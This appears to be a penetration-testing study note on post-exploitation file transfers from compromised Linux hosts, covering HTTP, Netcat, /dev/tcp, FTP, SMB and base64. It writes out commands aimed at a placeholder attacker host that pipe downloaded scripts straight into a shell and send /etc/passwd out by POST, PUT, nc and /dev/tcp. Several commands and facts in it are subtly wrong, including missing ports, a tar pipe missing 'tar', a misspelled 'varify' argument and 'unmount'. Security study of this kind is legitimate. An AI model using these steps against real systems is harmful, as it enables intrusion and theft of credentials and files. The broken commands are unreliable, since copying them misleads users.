---
created: 25-01-2026
tags:
  - Linux_PrivEsc
  - Linux
---
## Linux file transfers

File transfers are the backbone of post-exploitation. Almost every meaningful action depends on moving files between your attacker machine and the target:
- Uploading tools and exploits (e.g., enumeration scripts like `LinPEAS` or `pspy`).
- Downloading sensitive data from the target (password hashes, SSH keys, databases, etc.).
- Staging payloads for privilege escalation or pivoting.
Understanding how to transfer files reliably under constrained conditions is the first thing you'd need after getting a foothold.

Common communication channels you can use for file transfers include:
- HTTP/HTTPS downloads and uploads
- Raw TCP (Netcat)
- SSH/SCP
- FTP/TFTP
- SMB
- Bash pseudo-devices (`/dev/tcp`, `/dev/udp`)
- DNS (exfiltration via DNS tunneling)
- Clipboard/encoding

>[!tip]+ Common writable directories
> 
> - `/tmp` (world-writable, but may be mounted with `noexec` — this prevents execution of any files here).
> - `/dev/shm` (in-memory filesystem, survives `noexec`).
> - `/var/tmp` (persistent across reboots, unlike `/tmp`).
> - User home directories (`~`).

The target environment dictates your options. You might face:
- Missing utilities like `wget`, `curl`, or `scp`.
- Network restrictions: blocked outbound or inbound connections, blocked ports and protocols, etc.
- Limited writable directories (often only `/tmp` or `/dev/shm`).
- No interactive shell.
- etc.

## HTTP/HTTPS file transfers

>[!tip] HTTP/HTTPS is your first choice in most scenarios.
### Python HTTP server

- Python3 built-in HTTP server:

```bash
python3 -m http.server 8000
```

Python starts an HTTP server on port `8000` (the default is `8080`) and serves files **from the current directory**. 

>[!tip]+
>- To specify a custom directory to serve files from, you can use the `-d`/`--directory` option:
>```bash
>python3 -m http.server -d /tmp 8000
>```
>- To specify a IP address to bind to, use the `-b`/`--bind` option (the default is all interfaces — `0.0.0.0`):
>```bash
>python3 -m http.server -b 192.168.1.11 8000
>```

- Python2 fallback:

```bash
python2 -m SimpleHTTPServer 8000
```

- Test the server:

```bash
curl http://127.0.0.1:8000/file
```

If you access the server from the browser, you'll see a simple directory listing.


> [!tip]+
> - It's a good practice to compare the checksum of the file before and after the transfer to ensure they're identical:
> 
> ```bash
> sha256sum pspy64
> ```

### Python HTTPS server with a self-signed certificate

Some environments enforce HTTPS-only policies and block unencrypted HTTP connections. To bypass this, you can try setting up an HTTPS server using a self-signed certificate (this will work unless self-signed certificates are also restricted).

1. Generate a self-signed certificate:

```bash
openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 365
```

>[!interesting]+ Options break-down
>
> - `req`: Use the **certificate request** tool.
> - `-x509`: Generate a **self-signed certificate** instead of CSR ([Certificate Signing Request](https://en.wikipedia.org/wiki/Certificate_signing_request)).
> - `-newkey rsa:2048`: Create a **new RSA key**, 2048 bits long.
> - `-nodes`: **No DES** → don't encrypt the private key (required for Python servers).
> - `-keyout key.pem`: Save the private key to `key.pem`.
> - `-out cert.pem`: Save the certificate to `cert.pem`.
> - `-days 365`: Certificate validity period (1 year).

2. Create an HTTPS server script:

```Python
# https_server.py
import http.server
import ssl

PORT = 443
BIND_ADDRESS = "0.0.0.0"


handler = http.server.SimpleHTTPRequestHandler
httpd = http.server.HTTPServer((BIND_ADDRESS, PORT), handler)

httpd.socket = ssl.wrap_socket(
    httpd.socket,
    keyfile="key.pem",
    certfile="cert.pem",
    server_side=True
)
print(f"Serving HTTPS on port {PORT}")
httpd.serve_forever()
```

3. Start the server:

```bash
sudo python3 https_server.py
```

>[!note]+ `sudo` is needed to bind to ports lower than `1024`. This is not strictly required for an HTTPS server (you can serve it on any port), but may bypass port restrictions, if in place. 

>[!warning] Self-signed certificates will trigger warnings and might be blocked outright. On the target, use `-k` (`curl`) or `--no-check-certificate` (`wget`) to bypass validation.
### Downloading files using `wget` and `curl`

You can download files from an HTTP/HTTPS server to the target using `wget` or `curl` — assuming they're present on the target (common on modern Linux systems).

- Basic download:

```bash
wget http://<attacker_ip_address>:<port>/linpeas.sh
```

```bash
curl -s http://<attacker_ip_address>:<port>/linpeas.sh -o linpeas.sh
```

>[!note] `curl` requires `-o` to save, otherwise it will print the file to the terminal. `wget` saves by default.

- Specify output file:

```bash
wget http://<attacker_ip_address>:<port>/file -O /tmp/linpeas.sh
```

```bash
curl -s http://<attacker_ip_address>:<port>/file -o /tmp/linpeas.sh
```

- Skip certificate validation (necessary for self-signed certificates):

```bash
wget --no-check-certificate http://<attacker_ip_address>:<port>/file
```

```bash
curl -s -k http://<attacker_ip_address>:<port>/file
```

- Execute without writing to the disk (fileless execution):

```bash
wget -qO- http://<attacker_ip_address>:<port>/script.sh | sh
```

>[!note] `wget`'s `-q` flag (quiet) suppresses progress bar, and `-O-` outputs to `stdout`.

```bash
curl -s http://<attacker_ip_address>:<port>/script.sh | bash
```
### Programming language fallbacks for HTTP

If neither `curl` nor `wget` is available, fall back to scripting languages. Most Linux systems have Python, PHP, Perl, or Ruby installed.

>[!tip]+ Check what's installed on the system:
>```bash
>which python python3 php ruby perl
>```

- Python3 `urllib.request`:

```bash
python3 -c "import urllib.request; urllib.request.urlretrieve('http://<attacker_ip_address>/linpeas.sh','linpeas.sh')"
```

- Python3 `requests`:

```bash
python3 -c "import requests; open('linpeas.sh','wb').write(requests.get('http://<attacker_ip_address>/linpeas.sh').content)"
```

- Python2 `urllib`:

```bash
python -c "import urllib; urllib.urlretrieve('http://<attacker_ip_address>/linpeas.sh','linpeas.sh')"
```

- PHP:

```bash
php -r 'file_put_contents("linpeas.sh", file_get_contents("http://<attacker_ip_address>/linpeas.sh"));'
```

- Ruby:

```bash
ruby -e 'require "open-uri"; File.write("linpeas.sh", URI.open("http://<attacker_ip_address>/linpeas.sh").read)'
```

- Perl: 

```bash
perl -e 'use LWP::Simple; getstore("http://<attacker_ip>/linpeas.sh", "linpeas.sh");'
```


### Uploading files from the target (HTTP `POST`)

If you need to upload files **from the target machine** (for example, to retrieve sensitive information), you can set up an **upload server** on your machine and then `POST` files to it.

A simple way to do this is using Python's [`uploadserver`](https://pypi.org/project/uploadserver/) module:

1. Install [`uploadserver`](https://pypi.org/project/uploadserver/):

```bash
python3 -m pip install uploadserver
```

2. Start the server:

```bash
sudo python3 -m uploadserver --bind 0.0.0.0 80
```

Uploaded files are saved to the **current working directory** where the server is started.

- Upload files from the target using `curl`:

```bash
curl -X POST http://<attacker_ip_address>:<port>/upload -F "files=@/etc/passwd"
```

- Upload files using Python3:

```bash
python3 - << 'EOF'
import requests

with open('/etc/passwd', 'rb') as f:
	files = {'files': f}
	requests.post(
		'http://<attacker_ip_address>:80/upload', 
		files=files
	)
EOF
```

- `wget` does **not** support multipart `POST` uploads easily, but `uploadserver` supports **HTTP `PUT`**, which works cleanly with `wget`:

```bash
wget --method=PUT \
  --body-file=/etc/passwd \
  http://<attacker_ip_address>:80/passwd
```

This will save the file on the server as `passwd`.

>[!note] `wget` `PUT` file uploads only work if your `wget` version supports the `--method=PUT` option.
### HTTPS upload server with a self-signed certificate

1. Generate a self-signed certificate:

```bash
openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 365
```

2. Start the HTTPS server:

```bash
sudo python3 -m uploadserver --bind 0.0.0.0 443 \
    --server-certificate cert.pem \
    --server-key key.pem
```

>[!important] The web server should not serve the private key (`key.pem`). Store it in a separate directory.

- Upload files using `curl`:

```bash
curl -k -X POST https://<attacker_ip_address>/upload -F "files=@/etc/passwd"
```

>[!note] The `-k` (`--insecure`) option disables certificate verification. Without it, the request will fail because the certificate is self-signed.

- Upload files using Python3:

```bash
python3 - << 'EOF'
import requests

with open('/etc/passwd', 'rb') as f:
	files = {'files': f}
	requests.post(
		'http://<attacker_ip_address>:80/upload', 
		files=files,
		varify=False
	)
EOF
```

- Upload files with `wget` `PUT`:

```bash
wget --method=PUT \
  --body-file=/etc/passwd \
  --no-check-certificate \
  https://<attacker_ip_address>:443/passwd
```

>[!note] `requests` **verifies TLS certificates by default**. `verify=false` disables certificate validation.
### Alternative HTTP servers
If Python is not an option, you can set up an HTTP server using other tools:

>[!note] As before, first `cd` to the directory you want to serve.

- PHP built-in server:

```bash
php -S 0.0.0.0:8080
```

- Ruby one-liner:

```bash
ruby -run -e httpd . -p 8080
```

- BusyBox HTTP daemon (tiny, works on embedded systems):

```bash
busybox httpd -f -p 8080 -h /tmp
```
## Netcat file transfers

Netcat (`nc`) is the Swiss Army knife of networking. It's raw, ugly, and invaluable. When HTTP is blocked or unavailable, Netcat can transfer files over raw TCP.

Target -> attacker:

- On your attacker machine, set up a listener:

```bash
nc -lvnp 1337 > passwd.txt
```

- On the target machine:

```bash
nc <attacker_ip_address> < /etc/passwd
```

Netcat creates a TCP connection, and bash redirects the file contents into the socket. The listener on your attacker machine receives the data and writes it to `passwd.txt`.

>[!note] This method is **binary-safe** (i.e., you can transfer binaries).

Attacker -> target (exactly the same, reverse the direction):

- On the target machine, set up a listener:

```bash
nc -lvnp 1337 > pspy64
```

- On your attacker machine:

```bash
nc <attacker_ip_address> < ./pspy64
```

>[!tip]+ To check if binary transfer succeeded, use `file`:
>```bash
>file pspy64
>```
>If it shows `ELF 64-bit LSB executable`, the transfer has succeeded. If it shows `ASCII text` or `data`, the binary has been corrupted — likely due to encoding issues or a broken connection.
### Netcat + `tar`

When you need to transfer the entire directory, you can use `tar` to create its archive and then pipe it to Netcat:

- On the target:

```bash
tar czf - dir | nc <attacker_ip_address> 1337
```

- On your attacker machine:

```bash
nc -lvnp 1337 | xzf -
```

`tar czf -` compresses the directory to `stdout`, which is piped directly into Netcat. On the receiving end, `tar xzf -` reads from `stdin` and extracts the archive.

### Netcat variables

**`ncat` (Nmap's Netcat — more stable than traditional `nc` and has some additional features):**

- On the target machine:

```bash
ncat <attacker_ip_address> 1337 --send-only <file>
```

- On your attacker machine:

```bash
ncat -lnvp 1337 --recv-only > file
```

**BusyBox Netcat (minimal environments):**

- On the target machine:

```bash
busybox nc <attacker_ip_address> 1337 < file
```

- On your attacker machine:

```bash
busybox nc -l -p 1337 > file
```

>[!note] Different `nc` implementations have different flags. Traditional BSD netcat uses `-l -p`, GNU netcat uses `-lvnp`, and BusyBox varies by version. Test first or check `nc -h`.
## SCP and SSH-based transfers

If you have SSH access to the target (credentials, keys, or an existing session), SCP is the gold standard for file transfers. 

- Transfer file from your machine to the target:

```bash
scp local_file.txt user@<target_ip_address>:/tmp
```

- Transfer file from the target machine to your machine:

```bash
scp user@<target_ip_address>:/etc/passwd ./
```

- Transfer a directory recursively:

```bahs
scp -r ./exploit_files user@<target_ip_address>:/tmp/
```

- Use a non-standard port:

```bash
scp -P 2222 user@<target_ip_address>:/etc/passwd .
```

- Specify private key file:

```bash
scp -i id_rsa user@<target_ip_address>:/etc/passwd .
```

### SSH for interactive file transfers

If SCP isn't available but SSH is, you can still transfer files:

- Read a remote file directly (if the target user has permissions to do so):

```bash
ssh user@<target_ip_address> 'cat /etc/passwd' > passwd
```

- Write a file to the target:

```bash
cat local_file.txt | ssh user@<target_ip_address> 'cat > /tmp/file.txt'
```

- Transfer with compression:

```bash
tar czf - /local/dir | ssh user@<target_ip_address> 'tar xzf - -C /tmp/'
```

>[!note] SCP can be disabled in `sshd_config`.
## Bash built-ins: `/dev/tcp` and `/dev/udp`

Starting from version 2.04, Bash supports pseudo-devices `/dev/tcp` and `/dev/udp` that can be used to establish raw socket connections **without any external tools**.

```bash
/dev/tcp/<host>/<port>
/dev/udp/<host>/<port>
```

This is often used in _living-off-the-land_ scenarios when only Bash is available.

- Establish a connection using using `/dev/tcp`:

```bash
exec 3<>/dev/tcp/HOST/PORT
```

>[!interesting]+ How it works internally
>When Bash encounters `/dev/tcp/HOST/PORT`, it:
> 1. Calls `socket()` to create a socket file descriptor.
> 2. Calls `connect()` to establish a TCP connection.
> 3. Provides the file descriptor for I/O redirection.
>
>From the shell’s perspective, the socket behaves like a regular file descriptor and can be used with `<`, `>`, `read`, `echo`, `cat`, etc.

>[!important] `/dev/tcp` and `/dev/udp` work **only in Bash (and some Bash-compatible shells)**. They do **not** work in POSIX `sh`, `dash`, `ash`, or BusyBox `sh`.
>- Shell check:
>```bash
>echo $0
>```
>- Bash version:
>```bash
>bash --version
>```

>[!warning] This technique will not work in most restricted shells.

### Transferring files over `/dev/tcp`

1. On your attacker machine, set up a listener:

```bash
nc -lvnp 1337
```

2. On the target machine, assign a file descriptor (e.g., `3`) to the remote connection using [`exec`](https://man.archlinux.org/man/exec.3.en) builtin:

```bash
exec 3<>/dev/tcp/<attacker_ip_address>/1337
```

>[!interesting] This command establishes a TCP connection to the specified IP address on port `80`. The `<>` operator opens the file descriptor (`3`) for both reading from (`<`) and writing to (`>`) the TCP socket.

3. Send a file from the target machine:

```bash
cat /etc/passwd >&3
```

>[!warning] **Do not send raw binary files** (ELF, archives) this way. Bash redirections are not binary-safe — Base64-encode first.
>```bash
>base64 file | tr -d '\n' >&3
>```

>[!note] `/dev/udp` is only suitable for sending very small messages. Don't use it for file transfers — it's unreliable. You're very likely to get corrupted files.

- Close the connection (clean up the file descriptor):

```bash
exec 3<&-
exec 3>&-
```

## FTP

### Python FTP server

1. Install [`pyftpdlib`](https://pyftpdlib.readthedocs.io/en/latest/tutorial.html):

```bash
python3 -m pip install pyftpdlib
```

2. Start an FTP server:

```bash
python3 -m pyftpdlib --bind 0.0.0.0 --port 21
```

This server allows **anonymous login** and serves files from the **current directory**.

>[!note]+ By default, `pyftpdlib` uses TCP port `2121`.

### Connecting to an FTP server

- Connect to your FTP server from the target machine using the native `ftp` client (if available):

```bash
ftp <active_ip_address>
```

- For passive mode:

```bash
ftp -p <active_ip_address>
```

>[!note] If transfers hang, switch to passive mode. It is generally more reliable in restrictive environments.
### Downloading files over FTP

- List available files:

```bash
ftp> ls
```

```bash
ftp> dir
```

- Download a single file:

```bash
ftp> get file
```

- Download multiple files:

```bash
ftp> mget *
```

>[!important]+ Before downloading binaries, issue the `binary` command.
>```bash
>ftp> binary
>```

>[!tip]+ To check if binary transfer succeeded, use `file`:
>```bash
>file pspy64
>```
>If it shows `ELF 64-bit LSB executable`, the transfer has succeeded. If it shows `ASCII text` or `data`, the binary has been corrupted — likely due to encoding issues or a broken connection.

- In case of a non-interactive shell, you can use here-docs:

```bash
ftp -n <attacker_ip_address> <<EOF
user anonymous anonymous
binary
get file
quit
EOF
```
### Uploading files over FTP

- Upload a single file to an FTP server:

```bash
ftp> put test.txt
```

- Upload multiple files:

```bash
ftp> mput *
```

>[!important]+ Before uploading binaries, issue the `binary` command.
>```bash
>ftp> binary
>```

- Using here-docs:

```bash
ftp -n <attacker_ip_address> <<EOF
user anonymous anonymous
binary
put loot.txt
quit
EOF
```
### FTP without an FTP client

- If `ftp` client is not present on the target system, you can use Netcat to speak FTP:

```bash
nc <attacker_ip_address> 21
```

```bash
USER anonymous
PASS anonymous
PASV
RETR file
```

>[!note] In case of Netcat, you should use manual FTP commands. 

## SMB

SMB (Server Message Block) is primarily used for Windows file sharing, but it can be used on Linux hosts if the necessary clients are installed (e.g., `smbclient`).
### Impacket SMB server 

- On your attacking machine, start an SMB server using [`impacket-smbserver.py`](https://github.com/fortra/impacket/blob/master/examples/smbserver.py):

```bash
sudo impacket-smbserver share $(pwd)
```

This creates an SMB server that exposes a share named `share` and serves files from the **current directory**. It also allows anonymous access, and read/write by default.

- Bind to a specific interface:

```bash
impacket-smbserver share $(pwd) -ip 0.0.0.0
```

- Enable SMB2:

```bash
impacket-smbserver $(pwd) -smb2support
```

>[!note] If SMB connections fail, always retry with `-smb2support`.

- With authentication:

```bash
impacket-smbserver share $(pwd) -username user -password pass
```

>[!warning] Windows 10 (1709+) and Server 2019+ block guest access to SMB shares by default. You **must** use credentials.

### Connecting to an SMB server

- To connect to your SMB server from the target, you can use `smbclient`:

```bash
smbclient //<attacker_ip_address>/share -N
```

>[!note] `-N` -> no password (anonymous).

>[!tip]+ Guest SMB access blocked
>- If the guest SMB access from the target is blocked, set up credentials on your Impacket SMB server:
>```bash
>sudo impacket-smbserver share -smb2support /tmp/smbshare -user user -password pass
>```
>- Then connect to the SMB share with these credentials and download the file you need:
>```PowerShell
>smbclient //<attacker_ip_address>/share -U user
>```

- Close the connection:

```bash
smb: \> bye
```

### Downloading and uploading files

- List files:

```bash
smb: \> ls
```

- Download files:

```bash
smb: \> get file.txt
```

- Recursive download:

```bash
smb: \> recurse ON
```

```bash
smb: \> prompt OFF
```

```bash
smb: \> mget *
```

>[!note] SMB transfers are **binary-safe by default**, unlike FTP.

- Upload a file:

```bash
smb: \> put file.txt
```
### Mounting SMB shares

Mounting provides direct filesystem access, which is cleaner for large transfers.
To mount an SMB share named `share` at the directory `/tmp/smb`:

- Create a mount point:

```bash
mkdir -p /tmp/smb
```

- Mount anonymously:

```bash
sudo mount -t cifs //<attacker_ip_address>/share /mnt/smb -o guest
```

- Mount with credentials:

```bash
sudo mount -t cifs //<attacker_ip_address>/share /mnt/smb -o username=user,password=pass
```

- Unmount:

```bash
sudo unmount /tmp/smb
```
## Clipboard and Base64

Clipboard transfers can be used as a fallback option when all other methods fail. To do that safely:

1. Base64-encode the file:

```bash
base64 pspy64 > pspy64.b64
```

2. Select the entire Base64 text and copy it to the clipboard:

```bash
cat pspy.b64
```

3. Paste the content to a file on the target machine.

```bash
cat << 'EOF' > transferred.b64
<paste Base64 here>
EOF
```

4. Decode:

```bash
base64 -d pspy.b64 > pspy64
```

5. Verify the file after the transfer:

```bash
file pspy64
```

6. Grant executable permissions:

```bash
chmod +x pspy64
```

> [!tip]+
> - It's a good practice to compare the checksum of the file before and after the transfer to ensure they're identical:
> 
> ```bash
> sha256sum pspy64
> ```

>[!tip]+ You can also use Hex encoding ([`xxd`](https://man.archlinux.org/man/xxd.1.en)) instead of Base64. Base64 is more compact (4:3 ratio) than hex (2:1 ratio), but `xxd` is often present on minimal systems where `base64` isn't.

>[!tip]+ Chunking large files
> For very large files, break them into chunks to avoid terminal buffer limits:
> 
> - On your attacker machine:
> 
> ```bash
> split -b 1M pspy64 pspy64.part.
> ```
> 
> - Transfer each part individually, then reassemble on the target:
> 
> ```bash
> cat pspy64.part.* > pspy64
> ```

## Living-off-the-land

### `dd` for raw block transfers

`dd` can read from network sockets (via `/dev/tcp`) and write to files:

- On your attacker machine:

```bash
nc -lvnp 1337 < pspy64
```

>[!note] `nc` does **not** read from `stdin` until a client connects.

- On the target:

```bash
dd if=/dev/tcp/<attacker_ip_address>/1337 of=pspy64 bs=1024
```

`dd` is on every Linux system and handles binary data perfectly.
### `cat` and file redirection

- On tour attacker machine:

```bash
nc -lvnp 1337 < pspy64
```

- On the target:

```bash
cat < /dev/tcp/<attacker_ip_address>/1337 > pspy64
```

## References and further reading

- [`Linux File Transfers for Hackers — Juggernaut Pentesting Academy`](https://juggernaut-sec.com/author/thecyberjuggernaut/)

